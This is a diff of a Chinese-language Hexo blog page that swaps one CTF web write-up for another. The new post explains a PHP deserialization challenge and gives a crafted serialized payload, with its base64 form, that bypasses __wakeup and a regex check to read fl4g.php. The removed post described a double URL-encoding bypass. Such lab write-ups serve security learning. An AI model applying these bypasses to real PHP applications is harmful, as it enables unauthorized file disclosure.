@@ -7,7 +7,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   
   
-  <title>WriteUp1   | Hexo</title>
+  <title>xtctf   | Hexo</title>
 
   
     <link rel="apple-touch-icon" href="/images/favicon.png">
@@ -100,37 +100,34 @@
   <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
   <div class="container post-details" id="post-details">
     <div class="post-content">
-      <div class="post-title">WriteUp1</div>
+      <div class="post-title">xtctf</div>
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime" title="Update time"></i>
-          2020-12-17
+          2020-12-24
         </span>
         
       </div>
       <div class="markdown-body">
-        <h1 id="攻防世界web高手区003"><a href="#攻防世界web高手区003" class="headerlink" title="攻防世界web高手区003"></a>攻防世界web高手区003</h1><p> 首先打开题目<br><img src="https://i.loli.net/2020/12/17/pGbzECfmToRcXnF.png"></p>
-<p> 看/index.php   没反应<br> 看/index.phps  发现源码泄露</p>
-<p><img src="https://i.loli.net/2020/12/17/tkSm3W62geOZQDL.png"></p>
-<p> 审视代码，发现是URL编码与解码，且id=’admin’<br> 用burp进行编码</p>
-<p><img src="https://i.loli.net/2020/12/17/IJH4GWS2BdnCPqa.png"></p>
-<p> 发现浏览器会自动解码</p>
-<p><img src="https://i.loli.net/2020/12/17/6nNwkRtKq5JzdY1.png"></p>
-<p> 用burp编码两次</p>
-<p><img src="https://i.loli.net/2020/12/17/CgcTM8UhqilJ5EB.png"></p>
-<p> 再次尝试</p>
-<p><img src="https://i.loli.net/2020/12/17/9lJMkOna1XoiuLv.png"></p>
+        <p>#XTCTF</p>
+<p>打开题目<br><img src="https://i.loli.net/2020/12/24/gydsZaqw1fKeR53.png" alt="审视代码"></p>
+<p>构造函数__construct()在程序执行开始的时候对变量进行赋初值。析构函数__destruct()，在对象所在函数执行完成之后，会自动调用，这里就会高亮显示出文件。<br>在反序列化执行之前，会先执行__wakeup这个魔术方法，所以需要绕过，当成员属性数目大于实际数目时可绕过wakeup方法，正则匹配可以用+号来进行绕过。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Demo(<span class="string">&quot;fl4g.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">//O:4:&quot;Demo&quot;:1:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&#x27;O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>经过base64加密得到:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/12/24/nKcx3paDzkrGFUf.png"></p>
 <blockquote>
-<p>获得flag！</p>
+<p>得到flag！</p>
 </blockquote>
-<hr>
 
       </div>
       
         <div class="prev-or-next">
           <div class="post-foot-next">
             
-              <a href="/2020/12/17/The%20first%20try/" target="_self">
+              <a href="/2020/12/19/XCTF%204th-CyberEarth/" target="_self">
                 <i class="iconfont icon-chevronleft"></i>
                 <span>Prev</span>
               </a>
@@ -139,34 +136,17 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime" title="Update time"></i>
-              2020-12-17
+              2020-12-24
             </span>
             
           </div>
           <div class="post-foot-prev">
-            
-              <a href="/2020/12/18/WriteUp2/" target="_self">
-                <span>Next</span>
-                <i class="iconfont icon-chevronright"></i>
-              </a>
             
           </div>
         </div>
       
     </div>
     
-  <div class="post-catalog" id="catalog">
-    <div class="title">Contents</div>
-    <div class="catalog-content">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E5%8C%BA003"><span class="toc-text">攻防世界web高手区003</span></a></li></ol>
-    </div>
-  </div>
-
-  
-<script src="/js/catalog.js"></script>
-
-
-
 
     
       <div class="comments-container">
